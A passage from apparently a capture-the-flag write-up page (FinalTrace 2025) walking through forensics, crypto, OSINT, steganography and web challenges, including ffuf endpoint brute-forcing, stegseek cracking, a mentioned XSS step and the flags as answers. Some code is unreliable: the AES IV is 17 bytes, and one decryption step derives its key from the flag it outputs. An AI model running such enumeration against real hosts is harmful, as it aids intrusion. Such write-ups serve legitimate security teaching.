</pre></table></code></div></div><hr /><h2 id="flags"><span class="mr-2">Flags</span><a href="#flags" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><code class="language-plaintext highlighter-rouge">CYS{mirror_restored_but_soul_shattered}</code> — (this flag keeps the player in the denier path, B)<li><code class="language-plaintext highlighter-rouge">CYS{r3fl3ct10n_r3st0r3d_B2A}</code> — (this flag makes the player shift from denier path B, to healer path, A)</ul><h2> Flag</h2><code> CYS{r3fl3ct10n_r3st0r3d_B2A} </code><hr><h1 id="temporal-core-console"> Temporal Core Console <a href="/writeups/FinalTrace_2025/10-temporal-core-console.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="temporal-core-console">Temporal Core Console</h1><p><strong>Category:</strong> Forensics/Crypto<br /> <strong>Author:</strong> Varsaa H</p><hr /><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The Eon city has lost its memory core. You must analyze recovered data fragments, decode hidden signals, and recover the temporal flag to restore the city’s heart.</p><hr /><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Downloaded and inspected the provided artifacts:</p><ul><li><code class="language-plaintext highlighter-rouge">temporal_core.log</code><li><code class="language-plaintext highlighter-rouge">core_fragment.bin</code><li><code class="language-plaintext highlighter-rouge">memory_snapshot.img</code><li><code class="language-plaintext highlighter-rouge">temporal_beacon.wav</code><li><code class="language-plaintext highlighter-rouge">EON_FINAL.enc</code></ul><hr /><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><code class="language-plaintext highlighter-rouge">strings</code>, <code class="language-plaintext highlighter-rouge">xxd</code>, <code class="language-plaintext highlighter-rouge">base32</code>, <code class="language-plaintext highlighter-rouge">python</code><li>Audacity (or any WAV audio analyzer)<li>CyberChef (online multi-tool for encodings)<li>pycryptodome (Python AES library)</ul><hr /><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-inspect-the-memory-dump-for-keys"><span class="mr-2">Step 1: Inspect the Memory Dump for Keys</span><a href="#step-1-inspect-the-memory-dump-for-keys" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>strings memory_snapshot.img</p><p>text</p><p><strong>Found:</strong></p><ul><li>AES Key: <code class="language-plaintext highlighter-rouge">EONSYNCHRONIZE12</code><li>IV: <code class="language-plaintext highlighter-rouge">SYNCWAVESFLOW1234</code></ul><hr /><h4 id="step-2-decode-the-log"><span class="mr-2">Step 2: Decode the Log</span><a href="#step-2-decode-the-log" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>cat temporal_core.log | awk ‘{print $2}’ | tr -d ‘\n’ &gt; log.base32 base32 -d log.base32 &gt; fragment.bin</p><p>text</p><p>Base32-decoded the log, yielding an encrypted blob matching <code class="language-plaintext highlighter-rouge">core_fragment.bin</code>.</p><hr /><h4 id="step-3-aes-decrypt-the-fragment"><span class="mr-2">Step 3: AES Decrypt the Fragment</span><a href="#step-3-aes-decrypt-the-fragment" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>from Crypto.Cipher import AES</p><p>key = b’EONSYNCHRONIZE12’ iv = b’SYNCWAVESFLOW1234’</p><p>with open(‘core_fragment.bin’, ‘rb’) as f: data = f.read()</p><p>def unpad(s): return s[:-s[-1]]</p><p>cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(data) print(unpad(plaintext).decode())</p><p>text <strong>Output:</strong> This is the beacon. Decode its pulse next. QR in sound…</p><p>text Points to the audio file next.</p><hr /><h4 id="step-4-decode-temporal_beaconwav-morse"><span class="mr-2">Step 4: Decode <code class="language-plaintext highlighter-rouge">temporal_beacon.wav</code> (Morse)</span><a href="#step-4-decode-temporal_beaconwav-morse" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li>Loaded <code class="language-plaintext highlighter-rouge">temporal_beacon.wav</code> in an online Morse decoder or Audacity.<li>Decoded message:<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>  RECONSTRUCT THE CYCLE REVERSED SHA1 - FOLLOW THE PULSE
</pre></table></code></div></div><li>This hints the final XOR key is SHA1(reversed_flag).</ul><hr /><h4 id="step-5-decrypt-eon_finalenc"><span class="mr-2">Step 5: Decrypt EON_FINAL.enc</span><a href="#step-5-decrypt-eon_finalenc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>import hashlib</p><p>flag = “CYS{E0N_SYNCHRONIZED_2F3C}” rev = flag[::-1] sha1key = hashlib.sha1(rev.encode()).hexdigest() key_bytes = bytes.fromhex(sha1key)</p><p>with open(‘EON_FINAL.enc’, ‘rb’) as f: data = f.read()</p><p>decrypted = ‘‘.join(chr(b ^ key_bytes[i % len(key_bytes)]) for i, b in enumerate(data)) print(decrypted)</p><p>text</p><p><strong>Output:</strong> CYS{E0N_SYNCHRONIZED_2F3C}</p><p>text</p><hr /><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>CYS{E0N_SYNCHRONIZED_2F3C}</p><h2> Flag</h2><code> CYS{E0N_SYNCHRONIZED_2F3C} </code><hr><h1 id="the-watcher-s-gaze"> The Watcher's Gaze <a href="/writeups/FinalTrace_2025/11-the-watchers-gaze.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="the-watchers-gaze"><span class="mr-2">The Watcher’s Gaze</span><a href="#the-watchers-gaze" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Category</strong>: [OSINT]<li><strong>Author</strong>: [Akshitha]</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Go through a variety of open source data and find out the observer’s den. Follow lyra’s trail but beware do not get caught. All you need is right infront of your eyes, just know where to look.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Build up a narrative, look at various social media platforms, come up with a cohesive plot that built on the story.</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Metadat2go<li>Instagram<li>Github<li>Google docs</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-the-image"><span class="mr-2">Step 1: The Image</span><a href="#step-1-the-image" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><img width="750" height="422" alt="image" src="https://github.com/user-attachments/assets/eed1ecfe-6e15-4d74-bee0-7e123142b529" /></p><p>The binary numbers are decoys, they dont point to anything important</p><p>Things to dedue:</p><p>i. Bottom right: Instagram account (hinted by the purple/ blue colour scheme) @LC_HOURGLASS</p><p>ii. Extracting meta data</p><p><img width="738" height="827" alt="image" src="https://github.com/user-attachments/assets/5cc475ba-d453-4621-9025-4231d330328c" /></p><p>We see a hex value (6B011D)</p><p>It is a part of the flag, to be noted and kept</p><h4 id="step-2-the-instagram-account"><span class="mr-2">Step 2: The Instagram account</span><a href="#step-2-the-instagram-account" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><img width="940" height="290" alt="image" src="https://github.com/user-attachments/assets/b4dd9be4-f75a-4fad-ba09-32c53f821ae6" /></p><p>The bio points to a username (Caellum-Archivist)</p><p><img width="940" height="318" alt="image" src="https://github.com/user-attachments/assets/9cf91ad8-9a6a-450e-95f8-1e17ddbcc8cb" /></p><p>Upon inspection of the post caption, the last line has weird capitalization</p><p>In the word gift notice only capital letters (GIT)</p><h4 id="step-3-the-github"><span class="mr-2">Step 3: The github</span><a href="#step-3-the-github" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><img width="940" height="833" alt="image" src="https://github.com/user-attachments/assets/7096aa1f-b445-48b3-98cb-b4b4a2202037" /></p><p>In the old haven archive</p><p><img width="940" height="412" alt="image" src="https://github.com/user-attachments/assets/21e233c9-0612-4c02-acb3-7debf4e81c89" /></p><p>90210 points to a famous los angeles pincode</p><p>The reset attempts are dummies</p><p>Shes-gone-and-its-just-me-repo:-</p><p><img width="940" height="424" alt="image" src="https://github.com/user-attachments/assets/e08fe9cd-64ca-4003-a339-06b737174409" /></p><p>Multiple access_gate decoys so even if we want to get password from code it takes a little bit of time</p><p><img width="940" height="330" alt="image" src="https://github.com/user-attachments/assets/6bea8346-7dfd-450a-a6c2-3e368aec8aae" /></p><p>README points to a link</p><p><img width="940" height="385" alt="image" src="https://github.com/user-attachments/assets/e7dccaf3-9c6d-48f7-ae8c-f0f4767c384b" /></p><p>Enter the CITY NAME</p><p>Code- losangles/la</p><p><img width="940" height="439" alt="image" src="https://github.com/user-attachments/assets/b9a9d0ef-6681-4d8d-aada-b668a8ddc9a0" /></p><h4 id="step-4-the-google-doc"><span class="mr-2">Step 4: The Google Doc</span><a href="#step-4-the-google-doc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The information is all filler</p><p><img width="653" height="605" alt="image" src="https://github.com/user-attachments/assets/caa132d8-bfde-4824-b4cc-582eacaf99ec" /></p><p>Location coordinates of the picture point to</p><p>Griffith Observatory : 34.1184° N, 118.3004° W</p><p>Rest of the text is white and revealed when selected</p><p><img width="940" height="474" alt="image" src="https://github.com/user-attachments/assets/215469ba-3b60-436d-ac2b-5d0758abc278" /></p><p>Time: 12:47 + 3mins+ 1 sec 12:50:01</p><p>Piece together final flag from “VITAL DATA”</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{341184_125001_6B011D}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{341184_125001_6B011D} </code><hr><h1 id="challenge-name-exif-echoes"> Challenge Name - EXIF ECHOES <a href="/writeups/FinalTrace_2025/12-challenge-name-exif-echoes.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge-name---exif-echoes"><span class="mr-2">Challenge Name - EXIF ECHOES</span><a href="#challenge-name---exif-echoes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Category</strong>: [Forensics/OSint]<li><strong>Author</strong>: [ram]</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>[This <code class="language-plaintext highlighter-rouge">m0ment</code> is more than it appears. Its very properties are… peculiar. Only by understanding its deepest whispers can you unlock the path.]</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>[As the challenge title suggests “EXIF,” the first step is to run <code class="language-plaintext highlighter-rouge">exiftool</code> on the image. This would reveal two unusual timestamps. The “echoes” hint at a combination of these two values.]</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>[exiftool]<li>[timestamp-&gt;epoch unix ( https://www.epochconverter.com/ ) ]<li>[ Hexadecimal XOR calculator (e.g., [https://xor.pw/] ]<li>[stegseek]</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-discover-and-convert-timestamps"><span class="mr-2">Step 1: [Discover and Convert Timestamps]</span><a href="#step-1-discover-and-convert-timestamps" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>[exiftool m0ment.jpg]
</pre></table></code></div></div><p>[they scan exiftool, encounter a fake flag , which is a pastebin link which gives them sime vague hint ( btw bonus flag hidden as the authorname )(pastebin.com/r3LnLw4G ) ]</p><h4 id="step-2-generate-the-passphrase-via-xor"><span class="mr-2">Step 2: [Generate the Passphrase via XOR]</span><a href="#step-2-generate-the-passphrase-via-xor" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>[# No command, but use a hex XOR calculator
# Input 1 (hex): 1681140600
# Input 2 (hex): 1727203620 
# Output (hex): 1a6343020]
</pre></table></code></div></div><p>[This step accomplishes the core trick of the challenge. By treating the two epoch values as hexadecimal numbers and XORing them, we generate the final passphrase (1a6343020) needed for extraction.]</p><h4 id="step-3-extract-the-hidden-file--and-hence-the-flag"><span class="mr-2">Step 3: [Extract the Hidden File , and hence the flag]</span><a href="#step-3-extract-the-hidden-file--and-hence-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>echo "1a6343020" &gt; pass.txt
stegseek m0ment.jpg pass.txt
cat m0ment.jpg.out
</pre></table></code></div></div><p>[This command uses stegseek to rapidly test our generated password (1a6343020) against the image. stegseek confirms the password is correct and extracts the hidden file, saving it as m0ment.jpg.out.]</p><h3 id="flags"><span class="mr-2">Flags</span><a href="#flags" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>CYS{b0nus_fl1g_686}
CYS{T1m3_Fr4gm3nt5_R3v34l_Th3_P4th}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{T1m3_Fr4gm3nt5_R3v34l_Th3_P4th} </code><hr><h1 id="sneaky-notes"> Sneaky Notes <a href="/writeups/FinalTrace_2025/13-sneaky-notes.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="sneaky-notes"><span class="mr-2">Sneaky Notes</span><a href="#sneaky-notes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Category</strong>: [Web]<li><strong>Author</strong>: [Akshitha]</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Some notes were left behind, look deeper and you will find what is yours.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Look at easy potential web exploits to use</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Python<li>Flask</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-login-page"><span class="mr-2">Step 1: Login page</span><a href="#step-1-login-page" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><img width="940" height="400" alt="image" src="https://github.com/user-attachments/assets/fc04b343-df27-4891-9efb-36f9a14a22c7" /></p><h4 id="step-2-inspect-and-get-credentials"><span class="mr-2">Step 2: Inspect and get credentials</span><a href="#step-2-inspect-and-get-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><img width="940" height="283" alt="image" src="https://github.com/user-attachments/assets/38cbb7c8-4a20-4dd4-9702-54b093805560" /></p><h4 id="step-3-xss-payload-in-notes-page-to-get-flag"><span class="mr-2">Step 3 :XSS payload in notes page to get flag</span><a href="#step-3-xss-payload-in-notes-page-to-get-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><img width="940" height="462" alt="image" src="https://github.com/user-attachments/assets/f16cc1d7-466f-40a0-8489-26a3804c963f" /></p><p>#### Step 4: Flag found <img width="940" height="364" alt="image" src="https://github.com/user-attachments/assets/3b4683ab-a02e-44ce-968b-2b646105436c" /></p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{sneaky_notes_xss}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{sneaky_notes_xss} </code><hr><h1 id="eon-gate"> EON GATE <a href="/writeups/FinalTrace_2025/14-sneaky-notes.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="sneaky-notes"><span class="mr-2">Sneaky Notes</span><a href="#sneaky-notes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Category</strong>: [Web]<li><strong>Author</strong>: [Akshitha]</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Why wont the gate open?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The riddle and its relation with the given blocks.</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Pyhton<li>Flask</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-read-the-riddle"><span class="mr-2">Step 1: Read the riddle</span><a href="#step-1-read-the-riddle" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><img width="886" height="489" alt="image" src="https://github.com/user-attachments/assets/b8c211ed-bae0-4945-849d-75e149803a98" /></p><h4 id="step-2-rearrange-the-words"><span class="mr-2">Step 2: Rearrange the words</span><a href="#step-2-rearrange-the-words" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><img width="940" height="438" alt="image" src="https://github.com/user-attachments/assets/293f09a3-c972-4202-8870-d2d3add36e49" /></p><h4 id="step-3-submit-and-get-the-flag"><span class="mr-2">Step 3 :Submit and get the flag</span><a href="#step-3-submit-and-get-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><img width="940" height="429" alt="image" src="https://github.com/user-attachments/assets/65233667-a519-4ba3-a238-d7eba2bfbf54" /></p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{EON_REALIGNED}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{EON_REALIGNED} </code><hr><h1 id="mirror-shatter"> Mirror Shatter <a href="/writeups/FinalTrace_2025/15-challenge-name.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><ul><li><strong>Category</strong>: Web<li><strong>Author</strong>: Kirubahari</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The Challenge is about web enumeration and find the hidden endpoints and parameters to get the flag</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>What I did first - enumeration, bruteforcing for endpoints</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>ffuf<li>base64<li>python</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-finding-the-endpoint"><span class="mr-2">Step 1: Finding the endpoint</span><a href="#step-1-finding-the-endpoint" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ffuf -u "http://$IP:$PORT/FUZZ" -w WORDLIST --ic
</pre></table></code></div></div><p>It gives the hidden endpoint</p><h4 id="step-2-fidning-the-parameter"><span class="mr-2">Step 2: Fidning the parameter</span><a href="#step-2-fidning-the-parameter" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ffuf -u "http://$IP:$PORT/mirror?FUZZ=true" -w WORDLIST --ic -fs int(x)
</pre></table></code></div></div><p>Which gievs the hiddenendpoint which downlaods the zip file which has the encoded flag</p><h4 id="step-3-decoing"><span class="mr-2">Step 3: Decoing</span><a href="#step-3-decoing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cat flag.txt | base64 -d
</pre></table></code></div></div><p>which gives the decoded dna encoded text decoding gives the flag</p><h4 id="script"><span class="mr-2">Script</span><a href="#script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">sys</span>

<span class="n">MAP</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">00</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">C</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">01</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">G</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">10</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">T</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">11</span><span class="sh">'</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">dna_to_bytes</span><span class="p">(</span><span class="n">dna</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
    <span class="n">dna</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">dna</span><span class="p">.</span><span class="nf">split</span><span class="p">())</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">dna</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">DNA length not multiple of 4 (each byte = 4 nucleotides).</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">bits</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">MAP</span><span class="p">[</span><span class="n">nuc</span><span class="p">]</span> <span class="k">for</span> <span class="n">nuc</span> <span class="ow">in</span> <span class="n">dna</span><span class="p">)</span>
    <span class="n">out</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">bits</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">bits</span><span class="p">),</span> <span class="mi">8</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">out</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span> <span class="ow">and</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">-</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">b</span> <span class="o">=</span> <span class="nf">dna_to_bytes</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">b</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Decoding failed:</span><span class="sh">"</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">b</span> <span class="o">=</span> <span class="nf">dna_to_bytes</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">strip</span><span class="p">())</span>
